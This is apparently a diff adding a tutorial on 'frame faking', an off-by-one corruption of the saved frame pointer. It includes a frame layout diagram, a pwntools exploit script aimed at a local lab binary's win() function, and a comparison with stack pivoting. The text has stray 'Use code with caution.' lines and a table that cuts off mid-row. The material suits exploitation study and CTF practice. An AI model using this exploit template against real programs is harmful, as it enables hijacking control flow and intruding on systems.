@@ -1,1 +1,79 @@
+Frame Faking (closely related to EBP/RBP Control and Fake Stack Frames) is an advanced binary exploitation technique used to control execution flow by manipulating the Saved Frame Pointer (EBP in 32-bit, RBP in 64-bit).
+This approach is highly effective in Off-by-One vulnerabilities, where an input function (like read() or an improperly bounded loop) allows you to overwrite exactly one byte past the allocated buffer. In a tightly packed stack frame, that single byte allows you to corrupt the least significant byte (LSB) of the Saved Frame Pointer.
+By corrupting EBP/RBP, you trick the program into treating a region inside your input buffer as a legitimate execution frame, allowing you to trigger arbitrary function calls or ROP chains when the function returns.
+
+1. The Core Mechanic: How Frame Faking Works
+
+Every time a function executes its closing instructions (leave; ret), the CPU relies completely on the values stored in EBP/RBP to know where the stack boundary is.
+Recall that leave performs:
+1. mov esp, ebp (Shifts the stack pointer to match the base pointer)
+2. pop ebp (Pops the top value of the stack into the base pointer register)
+If an attacker uses an off-by-one vulnerability to alter the bottom byte of the Saved EBP, the register points slightly higher or lower in memory when the function finishes. The application doesn't crash immediately; instead, it adopts this "faked" address as its new frame reference. When the calling function later attempts to exit and runs its own leave; ret, the stack pointer (ESP) is dragged directly into the attacker's fake frame.
+
+2. Crafting the Fake Frame Layout
+
+Assume a function allocates a 64-byte buffer. If we use an off-by-one vulnerability, we can corrupt the LSB of the Saved EBP to point back into our own buffer at a specific offset.
+Inside our buffer, we must arrange the payload to look exactly like a valid system frame:
+text
+Buffer Start (Address: 0xffffd000)
++------------------------------------+
+
+|  Fake Saved EBP (4 bytes junk)    | <-- Pointed to by corrupted EBP
++------------------------------------+
+
+|  Target Function Address (win())   | <-- Act as the Fake Return Address
++------------------------------------+
+
+|  Padding bytes ('A's)              | 
++------------------------------------+
+
+|  Corrupted EBP LSB byte (\x00)     | <-- The single-byte overflow payload
++------------------------------------+
+Use code with caution.
+When the active function exits, EBP shifts to 0xffffd000. When the parent function exits, the second leave; ret execution forces ESP to land right on 0xffffd000, immediately popping our target function address into the Instruction Pointer (EIP).
+
+3. The Python Simulation Script (frame_fake.py)
+
+Using pwntools, we can precisely position the fake elements inside the buffer, compute the alignment adjustments, and execute the frame hijack.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Initialize context and process
+context.update(arch='i386', os='linux')
+io = process('./frame_vuln')
+
+# Static address of our target function (found via static analysis)
+win_address = p32(0x080491b6)
+
+# Constructing the fake frame inside the buffer space
+# Offset 0: Fake EBP (4 bytes padding)
+# Offset 4: The address we want to execute (win())
+fake_frame = b"AAAA" + win_address
+
+# Fill the rest of the 64-byte buffer up to the edge of the frame pointer
+padding_length = 64 - len(fake_frame)
+payload = fake_frame + (b"B" * padding_length)
+
+# The single-byte overflow that overwrites the lowest byte of the Saved EBP
+# We assume through debugger alignment that \x00 forces EBP to land at the start of our buffer
+payload += b"\x00"
+
+# Send the payload to trigger the off-by-one frame hijack
+io.recvuntil(b"Enter data: ")
+log.info("Deploying fake frame payload via off-by-one corruption...")
+io.send(payload)
+
+# Keep interaction open for the spawned shell
+io.interactive()
+Use code with caution.
+
+4. Comparison: Stack Pivoting vs. Frame Faking
+
+While both techniques manipulate the execution stack pointer, they target different constraints:
+
+Metric	Stack Pivoting	Frame Faking
+Overflow Size Required	Requires overwriting both Saved EBP and Return Address (typically 8+ bytes).	Requires as little as 1 byte (corrupting only the LSB of the Frame Pointer).
+Gadget Reliance	Heavily relies on finding an explicit leave; ret gadget inside the binary text space.	Exploits the target function's natural epilogue sequence without injecting extra execution jumps.
+Target Destination	Pivots the stack pointer to entirely new structures like the Heap or .bss section.
 
